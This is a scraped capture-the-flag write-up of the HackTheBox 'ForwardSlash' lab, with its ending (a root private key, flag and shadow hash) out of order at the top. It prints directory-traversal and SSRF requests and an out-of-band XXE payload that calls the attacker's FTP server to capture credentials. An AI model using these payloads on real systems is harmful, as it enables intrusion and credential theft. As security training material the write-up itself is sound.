3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn 5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8 6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi /vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA 1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o -----END RSA PRIVATE KEY----- This must be the root SSH key.\n$ chmod 600 id_rsa_root $ ssh root@forwardslash.htb -i id_rsa_root Let’s grab the loot!\nroot@forwardslash:~# cat root.txt 12c0583823e80694824b9dd3e6c2ae93 root@forwardslash:~# cat /etc/shadow | grep root root:$6$daB3I84E$NnzV4cHTAgWsPGWoBKLO2W6NotitrAk6udeTh0cxvXWHIkDXZQtss13QP2gTgFOMdIYdQ8CtvSxzznHI.nVmW.:18326:0:99999:7::: : [ffuf]:https://github.com/ffuf/ffuf [xxeserv]:https://github.com/staaldraad/xxeserv [PEASS]:https://github.com/carlospolop/PEASS-ng\n","wordCount":"3260","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png","datePublished":"2020-07-05T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/forwardslash/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">ForwardSlash</h1><div class=post-description>ForwardSlash HackTheBox writeup</div><div class=post-meta>&lt;span title='2020-07-05 00:00:00 +0000 UTC'>July 5, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;16 min&amp;nbsp;·&amp;nbsp;3260 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/linux/" class="post-tag" title="linux">linux&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hard/" class="post-tag" title="hard">hard&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a>
&amp;nbsp;·&amp;nbsp;&lt;a href=".RelPermalink">permalink&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png alt="ForwardSlash HackTheBox Machine"><p>ForwardSlash - Hard Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation-file-disclosure--directory-traversal>HTTP exploitation: file disclosure & directory traversal</a></li><li><a href=#http-exploitation-ssrf>HTTP exploitation: SSRF</a></li><li><a href=#http-exploitation-xxe>HTTP exploitation: XXE</a></li><li><a href=#network-exploitation-credential-stuffing>Network exploitation: credential stuffing</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation--from-chiv-to-pain>Privilege Escalation : from chiv to pain</a></li><li><a href=#decrypting-the-ciphertext>Decrypting the ciphertext</a></li><li><a href=#privilege-escalation--from-pain-to-root>Privilege Escalation : from pain to root</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> ForwardSlash</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/239>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 40</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><p><strong>TL;DR</strong>: There is a web application with a parameter vulnerable to file
disclosure, directory traversal and SSRF (not LFI/RFI). Then we can exploit
an OOB XXE over FTP to steal FTP credentials. Then with credential stuffing
we land on the box via SSH. On the system we exploit a SUID binary to read
a configuration file that leaks a database password. With credential stuffing
again we can elevate to a more powerful user via SSH. Then we have to break
a custom crypto algorithm to decrypt a ciphertext. The decrypted cyphertext
gives the password of a LUKS container. Then we can mount the container
with sudo permissions and get the root SSH private key.</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap	ffuf curl burpsuite xxeserv peass haiti openssh
</code></pre><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Let&rsquo;s start by scanning port and services with <a href=https://nmap.org/>nmap</a>:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Fri Jun 12 13:17:07 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.183
Nmap scan report for 10.10.10.183
Host is up (0.022s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 12 13:17:36 2020 -- 1 IP address (1 host up) scanned in 29.63 seconds
</code></pre><p>If we try to reach http://10.10.10.183, we are redirected to <a href=http://forwardslash.htb>http://forwardslash.htb</a></p><p>So let&rsquo;s edit <code>/etc/hosts</code> to add this entry:</p><pre tabindex=0><code>10.10.10.183 forwardslash.htb
</code></pre><h3 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h3><p>Let&rsquo;s see what we have at <a href=http://forwardslash.htb/>http://forwardslash.htb/</a></p><p>So the site was defaced. The defacer is talking about XML so there must be a XXE
and is also talking about <em>Automatic FTP Logins</em>.</p><h3 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h3><p>Let&rsquo;s find if there are files hidden somewhere with [ffuf][ffuf]:</p><pre tabindex=0><code>$ ffuf -u http://forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fc 403 -e .txt

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://forwardslash.htb/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Extensions       : .txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

.                       [Status: 200, Size: 1695, Words: 207, Lines: 42]
note.txt                [Status: 200, Size: 216, Words: 39, Lines: 5]
:: Progress: [76534/76534]┬á:: Job [1/1] :: 1700 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
</code></pre><p>There is one:</p><pre tabindex=0><code>$ curl http://forwardslash.htb/note.txt
Pain, we were hacked by some skids that call themselves the &#34;Backslash Gang&#34;... I know... That name...
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.

-chiv
</code></pre><p>So if there is a backup site it may be online too. Let&rsquo;s find it by bruteforcing virtual hosts with subdomains:</p><pre tabindex=0><code>$ ffuf -u http://10.10.10.183/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H &#39;Host: FUZZ.forwardslash.htb&#39; -fs 1695

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.183/
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Header           : Host: FUZZ.forwardslash.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 1695
________________________________________________

backup                  [Status: 200, Size: 1267, Words: 336, Lines: 40]
:: Progress: [38267/38267]┬á:: Job [1/1] :: 708 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
</code></pre><p>So let&rsquo;s add <code>backup.forwardslash.htb</code> to <code>/etc/hosts</code> too.</p><pre tabindex=0><code>10.10.10.183 backup.forwardslash.htb
</code></pre><p>We are redirected to <a href=http://backup.forwardslash.htb/login.php>http://backup.forwardslash.htb/login.php</a></p><p>There is a login form. We can use the registration page to sign up.</p><p>If we sign up and log in, we are redirected to <a href=http://backup.forwardslash.htb/welcome.php>http://backup.forwardslash.htb/welcome.php</a></p><h3 id=http-exploitation-file-disclosure--directory-traversal>HTTP exploitation: file disclosure & directory traversal<a hidden class=anchor aria-hidden=true href=#http-exploitation-file-disclosure--directory-traversal>#</a></h3><p>The <em>Change your Profile Picture!</em> feature is disabled.</p><p>But that&rsquo;s just from the HTML so let&rsquo;s edit the DOM, remove the <code>disabled</code>
attributes and send a request:</p><p>By doing a directory traversal on <code>/etc/passwd</code> we obtained a file disclosure:</p><pre tabindex=0><code>POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
...
Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt

url=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
</code></pre><pre tabindex=0><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
</code></pre><h3 id=http-exploitation-ssrf>HTTP exploitation: SSRF<a hidden class=anchor aria-hidden=true href=#http-exploitation-ssrf>#</a></h3><p>We can also see if there are any other pages:</p><pre tabindex=0><code>$ ffuf -u http://backup.forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fs 288

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://backup.forwardslash.htb/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 288
________________________________________________

login.php               [Status: 200, Size: 1267, Words: 336, Lines: 40]
register.php            [Status: 200, Size: 1490, Words: 426, Lines: 42]
index.php               [Status: 200, Size: 1267, Words: 336, Lines: 40]
logout.php              [Status: 200, Size: 1267, Words: 336, Lines: 40]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
api.php                 [Status: 200, Size: 127, Words: 22, Lines: 2]
dev                     [Status: 403, Size: 65, Words: 6, Lines: 1]
.                       [Status: 200, Size: 1267, Words: 336, Lines: 40]
welcome.php             [Status: 200, Size: 1267, Words: 336, Lines: 40]
environment.php         [Status: 200, Size: 1267, Words: 336, Lines: 40]
reset-password.php      [Status: 200, Size: 1267, Words: 336, Lines: 40]
hof.php                 [Status: 200, Size: 1267, Words: 336, Lines: 40]
:: Progress: [114801/114801]┬á:: Job [1/1] :: 1881 req/sec :: Duration: [0:01:01] :: Errors: 0 ::
</code></pre><p>It seems there is a dev endpoint that dives us a HTTP 403.
But even authenticated we can&rsquo;t access <a href=http://backup.forwardslash.htb/dev/>http://backup.forwardslash.htb/dev/</a></p><p>Hopefully the <code>url</code> parameter is not only vulnerable to file disclosure and path
traversal but also to SSRF (Server Side Request Forgery).
Maybe locally this will be allowed, so let&rsquo;s try teh following request in <a href=https://portswigger.net/burp>burp</a>:</p><pre tabindex=0><code>POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
...
Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt

url=http://backup.forwardslash.htb/dev/
</code></pre><p>Yes! We obtained the HTML code of the dev endpoint:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>h1</span>&gt;XML Api Test&lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>h3</span>&gt;This is our api test for when our new website gets refurbished&lt;/<span style=color:#f92672>h3</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/dev/index.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;xmltest&#34;</span>&gt;
</span></span><span style=display:flex><span>		&lt;<span style=color:#f92672>textarea</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;xml&#34;</span> <span style=color:#a6e22e>form</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;xmltest&#34;</span> <span style=color:#a6e22e>rows</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;20&#34;</span> <span style=color:#a6e22e>cols</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;50&#34;</span>&gt;&lt;<span style=color:#f92672>api</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>request</span>&gt;test&lt;/<span style=color:#f92672>request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>api</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>textarea</span>&gt;
</span></span><span style=display:flex><span>		&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>&gt;
</span></span><span style=display:flex><span>	&lt;/<span style=color:#f92672>form</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- TODO:
</span></span></span><span style=display:flex><span><span style=color:#75715e>Fix FTP Login
</span></span></span><span style=display:flex><span><span style=color:#75715e>--&gt;</span>
</span></span></code></pre></div><p>It&rsquo;s talking about XML and FTP login as said in the deface.</p><p>Let&rsquo;s try to send a default request to the XML api:</p><pre tabindex=0><code>POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
...
Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt

url=http://backup.forwardslash.htb/dev/index.php?xml=&lt;cyfun&gt;&lt;/cyfun&gt;
</code></pre><p>Nothing fancy yet.</p><h3 id=http-exploitation-xxe>HTTP exploitation: XXE<a hidden class=anchor aria-hidden=true href=#http-exploitation-xxe>#</a></h3><p>We noticed in the HTML code the following structure:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;api&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;request&gt;</span>test<span style=color:#f92672>&lt;/request&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/api&gt;</span>
</span></span></code></pre></div><p>So let&rsquo;s try to forge a simple XXE payload using it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE replace [&lt;!ENTITY xxe &#34;cyfun&#34;&gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;api&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;request&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/request&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/api&gt;</span>
</span></span></code></pre></div><p>So I tried to send something like that:</p><pre tabindex=0><code>url=http://backup.forwardslash.htb/dev/index.php?xml%3d&lt;?xml%20version%3d&#34;1.0&#34;%20?&gt;&lt;!DOCTYPE%20replace%20[&lt;!ENTITY%20xxe%20&#34;cyfun&#34;&gt;]&gt;&lt;api&gt;%20%20&lt;request&gt;%26xxe;&lt;/request&gt;&lt;/api&gt;
</code></pre><p>But this doesn&rsquo;t work. But let&rsquo;s remember the FTP hint!</p><p>Maybe the XXE is OOB (Out Of Band) only. In general, working with FTP for OOB is far better
than HTTP as it wil allows us to retrieve the whole file rather than the 1st line.
Here I don&rsquo;t think we will retrieve files but rather credentials as it&rsquo;s said there
is a FTP autologin feature. So we won&rsquo;t need a complex payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE root [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % ext SYSTEM &#34;ftp://10.10.15.32/&#34;&gt;</span> %ext;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;api&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;request&gt;</span>
</span></span><span style=display:flex><span>    dontcare
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/request&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/api&gt;</span>
</span></span></code></pre></div><p>Our payload will look like this:</p><pre tabindex=0><code>url=http://backup.forwardslash.htb/dev/index.php?xml%3d&lt;%3fxml%2520version%253d&#34;1.0&#34;%2520%3f&gt;&lt;!DOCTYPE%2520root%2520[&lt;!ENTITY%2520%25%2520ext%2520SYSTEM%2520&#34;ftp%3a//10.10.15.32/&#34;&gt;%2520%25ext%3b]&gt;&lt;api&gt;&lt;request&gt;dontcare&lt;/request&gt;&lt;/api&gt;
</code></pre><p>PS: even if <a href=https://portswigger.net/burp>burp</a> automatically URL encode key character for us we need to double
encore the key character in the xml payload for the request to work.</p><p>But before let&rsquo;s start [xxeserv][xxeserv], a fake FTP server, then, when submitting the request we
will receive the credentials:</p><pre tabindex=0><code>$ sudo xxeserv -p 21
[*] UNO Listening...
2020/07/05 19:32:51 [*] GO XXE FTP Server - Port:  21
2020/07/05 19:32:55 [*] Connection Accepted from [10.10.10.183:50146]
USER:  chiv
PASS:  N0bodyL1kesBack/
2020/07/05 19:32:55 [x] Connection Closed
2020/07/05 19:32:55 [*] Closing FTP Connection
</code></pre><p>Two important things were required here:</p><ul><li>running the FTP server on port 21 (eg. port 2121 was filtered)</li><li>adding a leading slash to the request (eg. <code>ftp://10.10.15.32/</code> works but <code>ftp://10.10.15.32</code> not)</li></ul><h3 id=network-exploitation-credential-stuffing>Network exploitation: credential stuffing<a hidden class=anchor aria-hidden=true href=#network-exploitation-credential-stuffing>#</a></h3><p>Let&rsquo;s see if we can re-use the FTP credentials on SSH:</p><pre tabindex=0><code>$ ssh chiv@forwardslash.htb
The authenticity of host &#39;forwardslash.htb (10.10.10.183)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;forwardslash.htb,10.10.10.183&#39; (ECDSA) to the list of known hosts.
chiv@forwardslash.htb&#39;s password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  5 17:42:11 UTC 2020

  System load:  0.0                Processes:            196
  Usage of /:   30.8% of 19.56GB   Users logged in:      0
  Memory usage: 19%                IP address for ens33: 10.10.10.183
  Swap usage:   0%

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jul  5 15:11:43 2020 from 10.10.14.230
chiv@forwardslash:~$
</code></pre><h3 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h3><p>Let&rsquo;s see what is inside <code>/var/backups/</code>:</p><pre tabindex=0><code>chiv@forwardslash:~$ ls -lhA /var/backups/
total 804K
-rw-r--r-- 1 root root            60K Mar 24 06:25 alternatives.tar.0
-rw-r--r-- 1 root root            38K Mar 24 06:17 apt.extended_states.0
-rw-r--r-- 1 root root           4.1K Mar  6 14:17 apt.extended_states.1.gz
-rw-r--r-- 1 root root           3.9K Mar  5 14:46 apt.extended_states.2.gz
-rw------- 1 pain pain            526 Jun 21  2019 config.php.bak
-rw-r--r-- 1 root root            437 Mar  5 14:07 dpkg.diversions.0
-rw-r--r-- 1 root root            207 Mar  5 14:47 dpkg.statoverride.0
-rw-r--r-- 1 root root           653K Mar 24 06:17 dpkg.status.0
-rw------- 1 root root            730 Mar 17 20:13 group.bak
-rw------- 1 root shadow          604 Mar 17 20:13 gshadow.bak
-r--r--r-- 1 root root            129 May 27  2019 note.txt
-rw------- 1 root root           1.7K Mar  5 14:46 passwd.bak
drwxrwx--- 2 root backupoperator 4.0K May 27  2019 recovery
-rw------- 1 root shadow         1.2K Mar  6 14:21 shadow.bak
</code></pre><p>There are:</p><ul><li><code>config.php.bak</code> owned by pain</li><li><code>note.txt</code> which is world readable</li><li><code>recovery</code> folder owned by the <code>backupoperator</code> group</li></ul><p>The only thing we can read for now is <code>note.txt</code>:</p><pre tabindex=0><code>Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.

-Pain
